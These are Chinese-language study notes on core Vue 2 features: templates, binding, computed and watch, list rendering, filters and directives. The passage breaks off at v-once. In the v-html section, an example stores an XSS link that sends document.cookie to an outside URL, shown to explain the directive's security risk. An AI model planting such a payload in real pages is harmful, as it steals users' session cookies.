## Vue核心

### 1.初识Vue

​    *1.让Vue 工作,就必须创建一个 Vue 实例,而且要传入 一个 配置对象*

​    *2.root容器的代码一样符合html规范,只不过混入了一些特殊的Vue语法;*

​    *3.root容器里面的代码被称为[Vue模板]*

​    *4.Vue实例和容器一一对应的关系*

​    *5.真实开发情况下 Vue 配合着 组件使用*

​    *6.{{xxx}}中的xxx需要写js表达式,而且xxx可以自动读取到data中的所有属性*

​    *7.一旦data中的数据发生改变,页面中用到该数据的地方也会自动更新* 

### 2.Vue的模板语法(:href)

*Vue的模板语法有两大类*

​      *1.插值语法*(常用语法)

​      *功能:解析标签体内容*

​      *写法:{{xxx}} xxx为js的表达式,而且可以读到data中的所有属性*

​      *2.指令语法*

​      *功能:解析标签(包括:标签的属性 标签内容 绑定事件 .....)*

​      *写法:v-bind:href="xxx" xxx同样为js表达式,而且可以读到data中的所有属性 Vue中有很多指令,*

​      *都是v-???的形式.*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>模板语法</title>
    <script src="JS文件/vue.js"></script>
</head>
    <div id="root">
        <h1>插值语法</h1>
        <p>你好,{{name}}</p>
        <h1>指令语法</h1>
        <a v-bind:href="url">百度网站</a>
        <hr>
        <a v-bind:href="school.url">B站</a>
    </div>

    <script>
       //创建Vue实例
    new Vue({
        el:"#root",
        data:{
            name:"world",
            url:"https://www.baidu.com/",
            school:{
                url:"https://www.bilibili.com/"
            }
        }
    })
    </script>
```

### 3.数据绑定

数据绑定: 单项数据绑定  data-->页面

​				双向数据绑定  data<-->页面(改变页面数据也会影响data数据)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>数据绑定</title>
    <script src="JS文件/vue.js"></script>
</head>
        <!-- 
            数据的绑定分两种:
            单项绑定数据(v-bind):
                    只能从data流向页面
            双项数据绑定(v-model):
                    不仅能从data流向页面,也可以从页面流向data
            双项绑定一般绑定都是值表单类元素上(如:input select等)
            v-module:value可以简写为 v-modle
         -->
<body>

    <div id="root">

        单项绑定数据: <input type="text" :value="name">
    
        <hr>
        双向绑定数据: <input type="text" v-model="name">
    </div>

    <script>
        //实例Vue
        new Vue({
            el: "#root",
            data: {
                name:"12345"
            }
        })
    </script>
```

### 4.el和data的两种写法

el两种写法   1.创建实例的时候配置 el  2.先创建Vue实例,随后再通过 

vm(对象名).$mount("#root") 

data两种写法: 对象式 函数式(组件必须使用)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>el和data的两种写法</title>
    <script src="JS文件/vue.js"></script>
</head>
<!--  el和data都存在两种写法  
            1.el有两种写法
                    (1)new Vue 的时候配置 el 
                    (2)先创建Vue实例,随后再通过vm.$mount('#root')指定el的值
            2.data有两种写法
                    (1)对象式
                    (2)函数式 (在组件时,必须用函数式) 组件可能创建多个实例,如果是对象式 将会出现多个实例共用一组数据,提供data函数,创建一个实例后
					 调用data函数,从而返回初始数据的一个全新数据
            3.注意:由 Vue 管理的函数,一定不要写箭头函数,一旦写了箭头函数,this就不是Vue实例,而是 window  -->

<body>
    <div id="root">
        {{name}}
    </div>
</body>
<script>
    //el 存在两种写法
    //第一种el的写法
    /*const v =  new Vue({
        // el:"#root",
        //第一种data的写法
         data:{
             name:"李白"
         }
     })
     //第二种el的写法
     v.$mount("#root");*/

    //第二种data的写法
    new Vue({
        el: "#root",
        data: function () {
            return {
                name: "李白"
            }
        }
    })
</script>
```

### 5.VMMV模型

视图 view   模板 module    Vue 实例为 模板视图

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Document</title>
    <!-- 引入Vue -->
    <script src="JS文件/vue.js"></script>
</head>
                <!-- 
            MVMV模板
                1.M:模板(module):data中的数据
                2.V:视图(view):模板代码(页面)
                3.VM:模板视图: Vue实例
            观察发现:
                1.data中所有的属性,最后都出现在vm身上
                2.vm身上的所有属性 及Vue原型身上的所有属性,都可以在Vue模板中直接使用.
                 -->
<body>
    <!-- 视图 页面      View    视图 -->
    <div id="root">
        <p>学校地址  : {{address}}</p>
        <p>学校名    : {{name}}</p>
        <!-- <p>可以获取到Vue对象里面 的 所有 内容 例如1{{$mount}}</p> -->
    </div>
</body>
<script>
    //Vue实例
  new Vue({             // ViewModule  视图模板
    el:"#root", 
    data:{             // Module  模板
        address:"南京",
        name:"南信大"
    }
  })
</script>
```

### 6.数据代理

#### 6.1回顾Object.defineProperty()方法

Object.defineProperty方法可以规定属性的值

用法: Object.defineProperty(obj,'操作的属性',{})

Object.defineProperty的高级用法

存在get用法(读取)    set(属性)用法(改变)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>回顾Object.defineProperty方法</title>
</head>
<body>
    <script>
        //当给对象一个 变量 属性
        let num = 20;
        //创建一个对象
        let obj = {
            name:"Tom",
            hobby:"basketball"
            //age:num 这是的age 值 需要 通过 num改变然后将 num 赋值给 age 对象的age属性才会发生改变
        }

        //Object.defineProperty() 基本用法
        //Object.defineProperty()是种 高级 给 对象添加属性的方法 可以 规定 属性的值
        /* Object.defineProperty(obj,'age',{
            value:13,  //属性值 为 13 且 不可修改 不可遍历  不可删除
            enumerable:true,  //可以遍历
            writable:true,     //可以修改
            configurable:true  //可以删除
         });*/
        
         //Object.defineProperty()的高级用法
         Object.defineProperty(obj,'age',{
             //get 方法  当有人读取这个对象的age 属性 时,函数get (getter)就会被调用,且返回值就是age的值
             get(){
                return num;
             },
             //set 方法 当有人修改这个 对象的age 属性 时,函数set (setter)就会被调用,且会修改具体的值
             set(value){
                num = value ;
             }
         })
        console.log(obj);
    </script>
```

#### 6.2何为数据代理

通过一个 对象 去操作 另一个对象的属性(无论属性是否存在)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>数据代理的定义</title>
</head>
<body>
    <!-- 定义:通过一个 对象 去操作另 一个 对象 -->
    <script>
        let obj1 = {x:100};

        let obj2 = {y:200};

        //通过obj1 没有的属性  操作  obj2  的 属性
        Object.defineProperty(obj1,'y',{
            get(){
                return obj2.y;
            },
            set(val){
                obj2.y = val ;
            }
        })
    </script>
</body>
</html>
```

#### 6.3Vue中的数据代理

Vue通过数据代理简化了编写的格式,  先将data中的数据 存放在 vm中的_data 

vm._data = data   

*vm中的 name 和 address 是 通过 Object.defineProperty()方法加上去的*

用户的信息放在data中 _ data 是 对象1     vm是对象2   正常使用vm中的data数据通过vm.__data使用   通过数据代理    将_data的数据 放到了 对象vm里面  _ data代理 vm

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Vue中的数据代理</title>
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <!-- 将 data 中 的 数据存放在 vm 的_data当中  即 vm._data = data
    
    vm中的 name 和 address 是 通过 Object.defineProperty()方法加上去的
    代理操作 ----- 将 _data中的数据放到了 vm 中 一份
    通过 vm 读取 name 获得是 _data 中的 name      
    Object.defineProperty(vm,'name',{
        get(){
            return _data.name;
        }
        set(val){
            _data.name = val; 
        }
    })
    -->
    <div id="root">
        <p>学校名称 : {{name}}</p>
        <p>学校地址 : {{address}}</p>
    </div>
    <script>
      let vm = new Vue ({
            el:"#root",
            data(){
                return{
                    name:"南信大",
                    address:"南京"
                }
            }
        })
    </script>
```

#### 6.4数据代理流程图

1.加工data 配置get set  

2.vm._data = data

<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202212151963.png" style="zoom:50%;" />

### 7.事件处理(methods)

#### 7.1鼠标事件的基本使用

事件的使用方法 v-on:click="函数名称"   @click="函数名称"

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>事件的基本使用</title>
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <!-- 事件 的 基本 使用 :
            1.使用v-on:xxx 或者 @xxx 其中xxx为事件名
            2.事件的回调需要配置在methods 对象中,最终会在vm上
            3.methods中配置的函数,不要用箭头函数!否则this就不是vm
            4.methods 中配置的函数 , 都是被Vue所管理的函数,this的指向都是组件实例化的对象
            5.@click = "demo" 和 @click ="demo($event)" 效果一样,但是后者可以传参 -->

    <div id="root">
        <p>事件的基本使用 : {{message}}</p>
        <!-- 没有 参数 -->
        <button v-on:click="showinfo1"> 点击 这个 按钮</button>
        <hr>
        <!-- 有 参数 -->
        <button v-on:click="showinfo2(12,$event)"> 点击 这个 按钮</button>
    </div>

    <script>
        //创建Vue实例
        const vm = new Vue({
            el:"#root",
            data(){
                return{
                    message:"点击事件"
                }
            },
            methods:{
                showinfo1(e){
                    console.log(e);
                    alert("同学你好呀!!!");
                },
                showinfo2(num,e){
                    console.log(e);
                    console.log(num);
                    
                }
            }
        })
    </script>
```

#### 7.2事件修饰符

​	 *1.prevent 阻止默认行为(常用)*

​      *2.stop 阻止事件冒泡(常用)*

​      *3.once 事件只触发一次(常用)*

​      *4.capture 使用事件的捕获模式*

​      *5.self 只有event.target是当前操作的元素是才触发的事件*

​      *6.passive 事件的默认行为立即执行,无需等待事件回调执行完毕*  

```html
   <div id="root">
    <!--   prevent 阻止默认行为(常用)  网页的跳转 -->
            <a href="http//www.baidu.com" v-on:click.prevent="showinfo">点击 事件 提示 信息 </a>  
    <!-- stop 阻止冒泡事件  -->
        <div class="box1" v-on:click = "showinfo3">
            <div class="box2" @click.stop="showmsg"> 点击事件  </div>
        </div>
    <!-- once 事件只触发一次 -->
        <button @click.once="showinfo2">按钮</button>
    
    </div>
```

#### 7.4键盘事件的基本使用

键盘事件

 *1.Vue中常用的案件别名*

​        *回车==>enter*

​        *删除==>delet*

​        *退出==>esc* *空格==>space*

​        *换行==>tab*

​        *上==>up*  *下==>down*

​        *左==>left*    *右==>right* 

​      *2.系统修饰键(用法特殊):Ctrl alt shift meta* 

​        *(1)配合keyup使用:按下修饰键的同时,再按下其他键,然后释放其他键,事件才能被触发*

​        *(2)配合keydown使用:正常触发*

​      *3也可以之定义键位名称*

​        *Vue.config.keyCodes.自定义键名 = 键码  keycode 键码  key键位名称*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>键盘事件的基本使用</title>
    <!-- 引入Vue -->
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <!-- 视图 页面 -->
    <div id="root">
        <!-- 键盘事件 -->
        <input type="text" placeholder="回车传入数据" @keyup.enter="showinfor">
    </div>
</body>
<script>
    //Vue实例
  new Vue({
    el:"#root",
    methods:{

        showinfor(e){
            console.log(e.target.value);
        }

    }
  })
</script>
```

### 8.计算属性(computed)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>计算属性computed</title>
    <!-- 引入Vue -->
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <!-- 计算属性
            1.定义:要用的属性不存在 , 需要通过已有的属性计算的来  
             (data下面的 值都是 Vue里面的属性  methods 下面的函数都是 Vue里面的方法)
            2.原理:底层借助Object.defineProperty的方法提供的getter 和 setter 
            3.get函数什么时候执行?
            (1).初次读取 计算的属性(fullname) 时
            (2).当依赖的数据方式改变时 会被调用
            4.优势:相比较 methods 内部存在 缓存机制,效率更高
            5.注:计算属性最终会出现在 Vue 上面,直接读取可以使用
            如果计算属性被修改,哪必须写set函数去响应修改,且set中引起计算 使得 依赖的数据发生改变 
         -->
    <!-- 视图 页面 -->
    <div id="root">
        姓 : <input type="text" v-model:value="name">
        <br>
        名 : <input type="text" v-model:value="surname">
        <p>全称 : {{fullname}}</p>
    </div>
</body>
<script>
    //Vue实例
  new Vue({
    el:"#root",
    data(){
      return{
           name:"张",
           surname:"三" 
          }
    },
    //计算属性
    computed:{
        // fullname:{
        //     //当读取get的时候 fullname 就会被调用 而且返回值就是 fullname 的 值    计算属性存在缓存
        //     //1.初次读取fullname的时候get就会被调用  2.所依赖的数据发生改变的时候
        //     get(){
        //         return this.name+"-"+this.surname
        //     },
        //     //set 何时被调用 当  fullname 被修改的时候
        //     set(val){
        //         const arr = val.split("-");
        //         this.name = arr[0];
        //         this.surname = arr[1];
        //     }
        // }
        //简写方式  当不需要使用 set 方法的时候 可以进行简写
        fullname(){
            return this.name+'-'+this.surname;
        }
    }
  })
</script>
  
</html>
```

### 9.监视属性(watch)

监视属性的语法

watch:{

​	(监视对象):{

​		(监视程度)

​		(传入的数据)newval oldval

​	}

}

注:监视属性和计算属性的区别

watch的使用范围大于computed 

*两个重要原则:*

​    *1.所有Vue管理的函数,最好写出普通函数,这样this的指向就是vm 或者 组件实例对象*

​    *2.所有不被Vue管理的函数(定时器,ajax函数等)最好写成箭头函数,这样this的指向才是vm 或者 实例对象*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>天气案例监视</title>
    <script src="JS文件/vue.js"></script>
</head>
<body>
<!-- 监视属性watch：
            1.当监视的属性变化时，回调函数自动调用，进行相关操作
            2.监视的属性必须存在，才能进行监视
            3.监视的两种方式：
                (1)new Vue 时传入watch配置
                (2)通过vm.$watch监视 
-->
   <div id="root">
       <h1>今天天气{{weather}}</h1>
       <hr>
       <button @click="swap">点击按钮</button>
   </div> 

   <script>
       new Vue({
           el:"#root",
           data() {
               return {
                   weather:"炎热"
               }
           },
           methods: {
               swap(){
                if(this.weather == "炎热"){
                    this.weather = "寒冷";
                    return;
                }
                this.weather = "炎热";
               }
           },
           watch:{
               weather:{
                   immediate:true,
                   handler(newval,oldval){
                            console.log(`当前天气状况${newval} ${oldval}`);
                   }
               }
            //简写方式
           }    
       })
   </script>
</body>
</html>
```

### 10.绑定样式(class)

*样式绑定:*

​        *1.class样式*

​          *写法:class="xxx" xxx可以是数组 字符串 对象*

​        *2.style样式*

​          *:style="{fontSize:xxx}"其中xxx为动态值*

​          *:style="[a,b]" a和b为对象*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>绑定class样式</title>
    <style>
        .basic{
            width: 200px;
            height: 200px;
            border: 1px solid black;
        }
        .happy{
            background-color: rebeccapurple;
            border: dashed 2px red;
        }
        .sad{
            background-color: grey;
            border: green solid 3px;
        }
        .nomal{
            background-color: skyblue;
        }

        
        .first{
            font-size: larger;
        }
        .second{
            text-align: center;
        }
        .third{
            color: tomato;
        }

    </style>
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <div id="root">
        <!-- 绑定class样式 ---字符串写法,适用于:样式的类名不确定,需要动态指定 随机选择(多 选 一) -->
        <div class="basic":class="changemood">{{message}}</div>

        <button @click="swap1">点击 切换 样式</button> <br/><br/>

        <!-- 绑定class样式---数组写法,适用于:要绑定的样式不确定.名字也不确定 自己选择(多 选 一) -->
        <div class="basic":class="arr">{{message}}</div>
        
        <button @click="one">点我引用样式1</button>
        <button @click="two">点我引用样式2</button>
        <button @click="three">点我引用样式3</button> <br/> <br/>

        <!--绑定class样式---对象写法,适用于:绑定样式确定.名字也确定,但是动态确定用不用(多选 多 一 零)  -->
        <div class="basic":class="Objarr">{{message}}</div> <br/><br/>


        <!-- 内样式的修改 里面的 styleObj 为 对象 而且里面的属性值 要符合 要求 来写-->
        <div class="basic":style="styleobj" >{{message}}</div>
    </div>

    <script>
        new Vue({
            el:"#root",
            data() {
                return {
                    message:'Juecheng',
                    changemood:"happy",
                    changearr:['first','second','third'],
                    arr:[],
                    Objarr:{
                        first:false,
                        second:false
                    },
                    styleobj:{
                        fontSize:'40px'
                    }
                }
            },
            methods: {
                swap1(){
                   let arr = ['happy','sad','nomal'];
                   //生成一个随机数
                   let index  =  Math.floor(Math.random()*3);
                   this.changemood = arr[index];  
                },
                one(){
                   this.arr = this.changearr[0];
                },
                two(){
                    this.arr = this.changearr[1];
                },
                three(){
                    this.arr = this.changearr[2];
                }
            },  
        })
    </script>
</body>
</html>
```

### 11.条件渲染(v-show)

*条件渲染*

​      *1.v-if* 

​          *写法:*

​            *(1).v-if = "表达式"*

​            *(2).v-else-if = "表达式"*

​            *(3).v-else="表达式"* 

​            *使用与:切换比较低的场景*

​            *特点:不展示的DOM元素会被直接移除*

​      *2.v-show*

​          *使用于:写法比较高的场景*

​          *特点:不会被移除,只是样式被隐藏了而已*

​      *3.使用v-if元素可能会获取不到(元素被删除) v-show一定获取的到(元素被隐藏)* 

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>条件渲染</title>
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>数字n为:{{n}}</div>
        <button @click="swap">点击按钮增加数值</button>

        <!--使用 v-show 展示数据  当n增加的时候显示数据  数据没有消失 只不过是通过 style:"display:none"隐藏了 -->
        <h1 v-show="n===1">数据1</h1>
        <h1 v-show="n===2">数据2</h1>
        <h1 v-show="n===3">数据3</h1>
        <!-- 使用 v-if 这时的数据会消失 直接被抹去  存在v-if 也存在 v-else 和 v-else if 和基本 的 js基础代码没啥区别-->
        <h1 v-if="n===1">数据1</h1>
        <h1 v-else-if="n===2">数据2</h1>
        <h1 v-if="n===3">数据3</h1>
    </div>


    <script>
        new Vue({
            el:'#root',
            data() {
                return {
                    n:0
                }
            },
            methods: {
                swap(){
                    this.n++;
                }
            }
        })
    </script>
</body>
</html>
```

### 12.列表渲染(v-for)

#### 12.1遍历列表

v-for指令:

​	1.用来展示列表数据

​	2.语法:v-for:"(item index) in  xxx " :key="index"

key是虚拟DOM的标识符  最好是唯一标准

​	3.可以遍历数组和字符串 对象

```html
  <div id="root">
        <h1>人员基本信息</h1>
        <ul>
            <!-- 遍历 对象 -->
            <li v-for="(p,index) in persons" ::key="index" >{{index}}  {{p.name}} {{p.age}} </li>
        </ul>

        <ul>
            <!-- 遍历数组 -->
            <li v-for="arr in changearr" ::key="index">{{arr}}</li>
        </ul>   
<script>
    new Vue({
        el:'#root',
        data() {
            return {
                // 创建的对象数组
                persons:[
                    {id:01,name:"张三",age:13},
                    {id:02,name:"李四",age:15},
                    {id:03,name:"王五",age:18}
                ],
                // 数组
                Array:[1,8,3,4,5],
                num:5
            }
        },
        computed:{
            changearr(){
                // 调用数组排序方法
                return this.Array.sort();
            }
        }
    })
</script>
```

#### 12.2key的基本原理

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>key的基本原理</title>
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <!-- key 的 基本 原理
                key是虚拟DOM对象的标识,数据发生改变的时候 Vue会根据新数据行程新的虚拟DOM
                会 和 旧的 虚拟DOM 进行比较 
            1.找到相同key值的 新旧 相同 的 虚拟 DOM ,
            虚拟DOM中内容改变 生成新的真实DOM替换之前的真实DOM
            虚拟DOM中内容不变的部分 沿用之前的真实DOM 
            2.没有在旧虚拟DOM中找到新虚拟DOM的key值
            创建新的真实DOM 然后渲染到页面 
            
            index作为key的问题:
            若对数据进行 逆序添加 逆序删除 等 破坏顺序 会产生没必要的DOM更新效率变低
            结构中包含输入类的DOM 会出现错误的DOM更新

            在开发中最好选择标识符唯一的数据作为 key 防止效率的降低 和 数据的错误

            数组的 unshif() 方法 将新创建的数据 添加 到数组的开头  push()方法 将新的数据添加到 数组的结尾  
        -->
    <div id="root">
        <h1>人员基本信息</h1>

        <button @click="add">点击 按钮 添加 信息</button>

        <ul>
            <li v-for="(p,index) in persons" :key="p.id" >{{index}}  {{p.name}} {{p.age}} 
                <input type="text">
            </li>
        </ul>
    </div>
<script>
    new Vue({
        el:"#root",
        data() {
            return {
                persons:[
                    {id:01,name:"张三",age:13},
                    {id:02,name:"李四",age:15},
                    {id:03,name:"王五",age:18}
                ]
            }
        },
        methods: {
            add(){
                //创建一个对选哪个
                let add = {
                    id:04,
                    name:'小丑',
                    age:19
                }
                this.persons.unshift(add);
            }
        },

    })
</script>
</body>
</html>
```

#### 12.3列表的过滤

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>列表过滤</title>
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <!-- 数据的过滤  
                 1.进行渲染页面  
                 2.计算属性进行过滤 计算出新的数据 
                 通过 filter() 返回具体的数值  过滤器
                 indexOf() 找到数组中配对的属性 当返回值不为-1 证明数值是存在的

                 注:当在数组中查找为"" 的数据 返回值也不为-1 所有的数据都具有"",
                 而且计算属性的特点为 1.初次读取fillpersons的数据 2.当数据发生改变的时候,再次调用

                列表的过滤 computed中写 计算属性  过滤(筛选数值) 需要筛选的数据 为 数组(里面存放了对象) 根据名字进行筛选
                筛选数组值的方法 为 filter()  不会改变原始的数组  filter(参数为一个数组)
                搜索指定项目   返回指定位置  找不到返回 -1   方法为 indexOf()
   -->
    <div id="root">
            <h1>查询表单</h1>
            <input type="text"  v-model="message" placeholder="请输入数据">
            <ul>
                <li v-for="p in fillpersons" ::key="p.id">
                    {{p.name}}  {{p.age}} {{p.sex}}
                </li>
            </ul>
    </div>

    <script>
        //创建Vue实例
        new Vue({
            el:"#root",
            data() {
                return {
                    message:"",
                   
                    persons:[
                        {id:"01",name:"李白",age:19,sex:"男"},
                        {id:"02",name:"李华",age:18,sex:"女"},
                        {id:"03",name:"华然",age:24,sex:"男"},
                        {id:"04",name:"然而",age:28,sex:"女"}
                    ],
                    //过滤后的数据存放在数组 fillpersons数组中
                   fillpersons:[]
                }
            },
            //computed 的 实现
            
             //#region 
            
            //计算属性作为过滤器   1.初始化的时候调用一次  2.当依赖的数据发生改变的时候调用
            // computed:{
            			//计算的属性为  fillpersons[]  将满足p.name.indexOf(this.message)!== -1;条件的数据返回给 fillpersons[]
           	 			//第一个return 返回数值  第二个return 返回是否满足过滤条件 (true false)
            //         fillpersons(){
            //             return this.persons.filter(  (p)=>{
            //                 return  p.name.indexOf(this.message)!== -1;
            //             })
            //         }
            // }  
            
            //#endregion
            
            //watch 的 实现
            watch:{
                message:{
                // 数据会立刻执行一次 这时的val值为 "" 注:当在数组中查找为"" 的数据 返回值也不为-1 
                immediate:true,
                //val 为传入的数据
                handler(val){
                    	//数组的filter()方法具有返回值(返回值为符合条件的新数组)  
                    	this.fillpersons = this.persons.filter((p)=>{
                        // p.name中是否含有val值  含有不为-1 不存在为-1,返回值为 false/true
                          return p.name.indexOf(val) !== -1;
                       	//返回值为真 将数组当前下标的数据传递给fillpersons数组
                    });  
                }
                }
            }
        })
    </script>
</body>
</html>
```

#### 12.4列表的排序

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>列表过滤</title>
    <!-- 引入vue.js文件 -->
    <script src="./JS文件/vue.js"></script>
</head>

<body>
    <div id="root">

        <button @click="sortNumber=0">保持原数据</button>
        <button @click="sortNumber=1">升序</button>
        <button @click="sortNumber=2">降序</button>

        <!-- 遍历对象 -->
        <ul>
            <li v-for="(p) in fillArr" :key="p.id">
                {{p.id}} {{p.name}} {{p.age}}
            </li>
        </ul>
    </div>
</body>

<script>
    // 创建vue 实例
    new Vue({
        el: "#root",
        data() {
            return {
                message: "",
                // 创建数组对象
                personsArr: [
                    { id: 01, name: "李小白", age: 22 },
                    { id: 02, name: "杜小白", age: 25 },
                    { id: 03, name: "李小黑", age: 23 },
                    { id: 04, name: "杜小黑", age: 24 },
                    { id: 05, name: "张小红", age: 26 }
                ],
                sortNumber:0,
            }
        },
        //列表排序的知识点
        computed:{
            // 计算属性  列表的过滤    列表的排序
               fillArr(){
                    // 先过滤  filter() indexOf() 存在返回值
                    const sortArr =  this.personsArr.filter((p)=>{
                        // 返回是否满足过滤条件
                        return p.name.indexOf(this.message) !== -1;
                    })
                    
                    /*排序的基本方法  数组.sort((数据1,数据2)=>{
                    		return 数据1 - 数据2  升序 反之降序
                    })*/
                    
                    //后排序
                    if(this.sortNumber){
                    // 数组的排序方法 sort()
                        sortArr.sort((p1,p2) => {
                    //判断是进行升序 还是降序
                            return this.sortNumber == 1 ? p1.age -p2.age: p2.age-p1.age;
                        });
                    }
                    return sortArr;
               }
        }
    })
</script>

</html>
```



#### 12.5数据的监测

**模拟数据监测**

```JavaScript
对象的数据监测   通过Object.defineProperty()中的get 和 set 方法实现监测 当通过set改变数据的时候,就需要解析模板生成虚拟DOM和真实DOM进行对比
更改页面  (响应式改变)
添加数据通过  vue中的set()方法  可以做到响应式  set()的使用对象不可以是Vue本身 和 它的根对象
<sript> 
      //模仿数据检测的     
      //创建一个对象
            let data ={
                name:"李白",
                message:"诗人"
            }
            //创建一个监视的实例对象,用来监视data中属性的变化
            let obs = new Observer(data);
            // console.log(obs);
            //创建构造函数
            function Observer (obj) {
            // 汇总所有的对象属性形成一个数组
                const key = Object.keys(obj);
            //  展示汇总的数组  为  name和message
            console.log(key);
            //遍历数组
            key.forEach((k) => {
                Object.defineProperty(this,k,{
                    get(){
                        return obj[k];
                    },
                    set(val){
                        //当调用set()方法时候,需要解析模板,生成虚拟DOM和真实DOM进行对比 更新页面数据
                        obj[k] = val;
                    }
                })
            })
            }
```

```html
数组的监测    数组在vue中不存在 set() 和 get()方法  
数据的响应式更改  1.包装数组的变更方法 2.解析模板
<!DOCTYPE html>
<html lang="en">
<head>
    <title>数组的数据监测</title>
    <script src="JS文件/vue.js"> </script>
</head>
<body>
    <div id="root">
            <ul>
                <!-- 遍历数组 -->
                <li v-for=" p in persons.arr">
                     {{p}}
                </li>
            </ul>
            <button @click="one">在最后一行添加数据</button>
    </div> 

    <script>
        new Vue({
            el:"#root",
            //数组中不存在 set()方法 响应式的改变数据
            //包装数组的变更方法  不可以通过索引值更改数据
            data() {
                return {
                persons:{
                   arr:["李白","杜甫","白居易","李贺"]
                }
                }
            },
            methods:{
                one(){
                    //push 在函数 末尾添加数据
                    this.persons.arr.push("王维");
                }
            }
        })
    </script>
</body>
</html>
```

##### 12.5.1数组变更的方法

可以操作 数组 的 七大方法

```
前面5种方法都是对数组进行 增删操作
```

1. push(添加的内容)

  \* 数组的末尾添加新项目,并返回新的长度.

  \* 注:存在返回值 改变数组

2. unshift(添加的内容)

  \* 在数组的开头添加项目,并返回新的长度.

  \* 注:存在返回值 改变数组

3. pop()

  \* 移除数组的最后一个元素,并返回该元素

  \* 注:返回最后删除的元素

4. shift()

  \* 移除数组的第一项,并返回该元素

  \* 注:返回删除的元素

5. splice()

  \* 可以添加数组/删除数组 返回删除的项目

  \* splice(要操作元素的位置,0(添加数据),要添加的内容)

  \* splice(要操作元素的位置,1(删除数据),无需添加内容)

  \* 注:在删除数据的时候,存在返回值为删除的数据

  \* `后面2种是对数组的结构操作`

6. sort()

  \* 对数组进行排序可以 升序  可以降序 

* 注:直接改变数组的样式

7.reverse()

  \* 可以直接使用 且 没有返回值

  \* 将数组元素进行反转

  \* 注:改变原始的数组

### 13.表单数据(input)

![image-20220221214811820](image-20220221214811820.png)

**表单的特殊获取内容**

   *1.type="radio" 则v-model 收集的是value 需要配置value*

  *2.type="checkbox" 则v-model 收集的是value值,配置input的value值 v-model初始化值为数组*

​        *注:v-model的三个修饰符:*

​      *number:输入的字符串转换成有效数字*

​      *lazy:失去焦点再收集数据* 

​      *trim:输入的首尾空格过滤*

### 14.过滤器(filters)

day.js的API   dayjs(时间) 进行解析.format("展示的形式")

![](https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202220906441.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>过滤器</title>
    <script src="JS文件/vue.js"></script>
    <script src="JS文件/dayjs.min.js"></script>
</head>
<body>
    <div id="root">
            <!-- 三种实现时间戳的方法 -->
            <h1>计算属性实现</h1>
            <p>现在时间是:{{currentTime}}</p>

            <h2>方法实现</h2>
            <p>现在时间是:{{getCurrentTime()}}</p>

            <h3>过滤器实现</h3>
            <!-- filterCurrentTime不加小括号 将参数 time传递给函数 filterCurrentTime() 最后返回值替代插值法的内容 -->
            <p>现在时间是:{{time | filterCurrentTime}}</p>
            <!-- filterCurrentTime加小括号 将参数 time和添加的参数都传递给函数 filterCurrentTime() 最后返回值替代插值法的内容 -->
            <p>现在时间是:{{time | filterCurrentTime1('YYY_MM_DD HH:mm:ss')}}</p>
    </div>


    <script>
        new Vue({
            el:"#root",
            data(){
                return{
                    time:1645490890615,
                }
            },
            //计算属性
            computed:{
                    currentTime(){
                        return dayjs(this.time).format("YYYY年MM月DD号 HH:mm:ss");
                    }
            },
            //函数实现
            methods: {
                getCurrentTime(){
                        return dayjs(this.time).format("YYYY年MM月DD号 HH:mm:ss");
                }
            },
            //局部过滤器实现  过滤器的本质就是函数  
            filters:{
                filterCurrentTime(val){
                        return dayjs(val).format("YYYY年MM月DD号 HH:mm:ss");
                },
                filterCurrentTime1(val){
                        return dayjs(val).format(str);
                }
            }
        })
    </script>
</body>
</html>
```

### 15.内置指令

#### 15.1.v-text指令

作用:向其所在的节点(标签)中渲染文本内容

与插值语法的区别:v-text会替换掉节点的所有内容,插值语法不会,也不会解析标签.

#### 15.2.v-html指令

与v-text的区别:v-html可以传递标签  (存在安全性问题)

**信息的安全性与cookie息息相关**

<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202220939745.png" alt="image-20220222093959471" style="zoom:50%;" />

<img src="https://notebook-img.oss-cn-shanghai.aliyuncs.com/old-img/202202220941421.png" alt="image-20220222094120282" style="zoom:50%;" />

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>v-html指令</title>
    <script src="JS文件/vue.js"></script>
</head>
<body>
    <div id="root">
            <div v-html="message"></div>
    </div>
    <script>
        new Vue({
            el:"#root",
            data() {
                return {
                    //document.cookie 获取当前网页的全部cookie ? 表示传参    点击时 将当前网页所有cookie传递给跳转的网页
                    message:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点击跳转页面,你需要的资源都在这里!!!</a>'
                }
            },
        })
    </script>
</body>
</html>
```

#### 15.3.v-cloak指令

 作用:当网速过慢的时候,会通过class样式将未经解析的模板进行隐藏

 当vue可以使用时,v-cloak指令将会删除!

#### 15.4.v-once指令

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>v-once指令</title>
    <script src="JS文件/vue.js"></script>
